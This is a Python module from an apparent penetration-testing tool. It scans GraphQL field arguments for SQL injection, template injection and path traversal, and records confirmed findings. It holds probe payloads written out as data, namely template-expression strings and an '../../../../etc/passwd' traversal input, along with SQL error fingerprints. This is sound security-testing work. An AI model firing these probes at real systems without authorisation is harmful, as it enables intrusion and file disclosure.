"""GraphQL field-argument injection validator (SQLi / SSTI / LFI).

owlforge's deterministic pre-probe confirms SQLi/SSTI/LFI/… on URL and body params, but it
never reaches GraphQL FIELD ARGUMENTS — so an injectable resolver argument (e.g. brokencrystals'
testimonialsCount(query), which drops a raw string into SQL) slips past every validator and the
evidence gate rejects the model's note. This closes that gap: it introspects the schema and, for
each String argument, confirms the same three classes deterministically:

  * SQLi — a syntax-breaking quote makes the backend leak a DB error that a benign value does not
    (error-based), OR a boolean pair (1=1 vs 1=2) returns different scalar data (boolean-based).
  * SSTI — a `{{1337*1337}}`-style payload evaluates to the unique product 1787569.
  * LFI  — `../../../../etc/passwd` returns the file's `root:x:0:0` marker.

Reuses graphqlrce's introspection/query-building so it stays in step with the RCE validator.
"""

from __future__ import annotations

import re
import secrets
from collections.abc import Callable

from owlforge.engine.graphqlrce import _build_query, _gql, _introspect

# DB error fingerprints that prove input reached the SQL parser (not present for a benign value)
_SQL_ERR = re.compile(
    r"syntax error at or near|unterminated quoted string|quoted string not properly terminated|"
    r"you have an error in your sql syntax|SQLITE_ERROR|sqlite3\.|unrecognized token|"
    r"ORA-\d{5}|PLS-\d{5}|PG::|psql:|pg_query|Npgsql|SQLSTATE|PDOException|"
    r"SQL Server|mysql_fetch|valid MySQL result|org\.postgresql|near \"", re.I)
_SSTI_MARK = "1787569"                       # 1337 * 1337
_SSTI_PAYLOADS = ("{{1337*1337}}", "${1337*1337}", "#{1337*1337}", "<%=1337*1337%>",
                  "{{1337*1337}}", "*{1337*1337}")
_LFI_PAYLOAD = "../../../../etc/passwd"
_LFI_MARK = "root:x:0:0"


def _body(sandbox, url, field, arg, value, headers):
    q = _build_query(field, arg, value)
    return (q, _gql(sandbox, url, q, headers) if q else "")


def _file(assessment_id, url, field_name, cls, severity, query, signal, evidence, note):
    from owlforge.store.db import session
    from owlforge.store.models import Finding
    with session() as s:
        s.add(Finding(
            id=f"find_{secrets.token_hex(5)}", assessment_id=assessment_id,
            title=f"{cls} via GraphQL '{field_name}' argument",
            severity=severity, status="validated", confidence="high",
            endpoint=url, method="POST",
            technical_analysis=(
                f"The GraphQL field '{field_name}' passes a String argument into a "
                f"{cls.lower()} sink: {note}"),
            proof_of_concept=f"{query}\n\n-> {signal}\n\n{(evidence or '')[:500]}",
            impact="Depends on the class: database read/modify (SQLi), server-side code or file "
                   "access (SSTI), or arbitrary file disclosure (LFI).",
            remediation="Parameterize queries / sandbox templates / canonicalize and allow-list "
                        "file paths; never pass a resolver argument into these sinks raw.",
            validation_note=f"GraphQL {cls} via field argument, deterministically confirmed",
            success_signal=signal))
        s.commit()


def _probe_field(assessment_id, url, field, sandbox, headers, log) -> int:
    filed = 0
    for inj in [a for a in field["args"] if a["is_string"]]:
        aname = inj["name"]

        # --- SQLi: error-based. Inject a UNIQUE marker + quote; proof = a SQL-specific error
        #     whose text echoes our marker (so the value provably reached the SQL parser). The
        #     marker requirement rules out an unrelated DB error being mistaken for a hit. ----
        marker = "owl" + secrets.token_hex(3)
        q, rq = _body(sandbox, url, field, inj, marker + "'", headers)
        m = _SQL_ERR.search(rq or "")
        if m and marker in (rq or ""):
            _file(assessment_id, url, field["name"], "SQL injection", "high", q,
                  f"DB error referencing the injected value: {m.group(0)!r}", rq,
                  f"the value of '{aname}' is concatenated into a SQL statement (a marker + quote "
                  "produced a database error quoting the marker).")
            filed += 1
        base = ""   # SSTI/LFI check their own marker's absence directly

        # --- SSTI (unique product) ---------------------------------------------------------
        for payload in _SSTI_PAYLOADS:
            q, r = _body(sandbox, url, field, inj, payload, headers)
            if _SSTI_MARK in (r or "") and _SSTI_MARK not in (base or "") and _SSTI_MARK not in q:
                _file(assessment_id, url, field["name"], "Server-side template injection",
                      "high", q, f"template evaluated to {_SSTI_MARK}", r,
                      f"'{aname}' is rendered as a template ({payload} -> {_SSTI_MARK}).")
                filed += 1
                break

        # --- LFI -----------------------------------------------------------------------------
        q, r = _body(sandbox, url, field, inj, _LFI_PAYLOAD, headers)
        if _LFI_MARK in (r or "") and _LFI_MARK not in (base or ""):
            _file(assessment_id, url, field["name"], "Path traversal / LFI", "high", q,
                  "/etc/passwd contents returned (root:x:0:0)", r,
                  f"'{aname}' reads arbitrary files (../../../../etc/passwd).")
            filed += 1
        if filed:
            break                            # one confirmed class per field is enough signal
    return filed


def graphql_inject_scan(assessment_id, inventory, sandbox, session_headers=None,
                        log: Callable[[str], None] = lambda m: None, target: str = "",
                        cap: int = 15) -> int:
    """Confirm SQLi / SSTI / LFI through GraphQL field arguments. Returns findings filed."""
    if sandbox is None:
        return 0
    from owlforge.engine.graphqlscan import _endpoints
    eps = _endpoints(inventory, sandbox, session_headers, target)
    if not eps:
        return 0
    filed = 0
    for url in eps[:3]:
        fields = [f for f in _introspect(sandbox, url, session_headers)
                  if any(a["is_string"] for a in f["args"])]
        if fields:
            log(f"graphql-inject: testing {min(len(fields), cap)} field(s) for SQLi/SSTI/LFI at {url}")
        for field in fields[:cap]:
            filed += _probe_field(assessment_id, url, field, sandbox, session_headers, log)
    if filed:
        log(f"graphql-inject: {filed} GraphQL argument injection(s) confirmed")
    return filed
